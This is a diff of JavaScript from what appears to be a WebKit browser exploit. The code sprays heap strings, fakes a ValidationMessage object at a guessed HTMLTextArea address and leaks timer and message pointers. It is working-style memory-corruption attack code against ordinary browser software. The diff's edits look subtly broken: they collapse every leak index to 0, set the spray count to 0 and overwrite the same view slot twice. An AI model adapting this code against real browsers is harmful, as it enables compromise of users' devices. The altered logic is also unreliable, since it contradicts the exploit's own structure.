@@ -39,7 +39,7 @@ var g_obj_str = {};
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
 var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 
-var g_round = 2;
+var g_round = 1;
 var g_input = null;
 
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
@@ -333,7 +333,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[4] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[0] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -343,7 +343,7 @@ function reuseTargetObj() {
 		 * Spray a couple of StringImpl obj. prior to Timer allocation
 		 * This will force Timer allocation on same SmallPage as our Strings
 		 */
-		sprayStringImpl(1, SPRAY_STRINGIMPL);
+		sprayStringImpl(0, SPRAY_STRINGIMPL);
 
 		g_frames = [];
 		g_round += 1;
@@ -363,13 +363,13 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][0]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][1]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
 				g_round++;
 			}
 
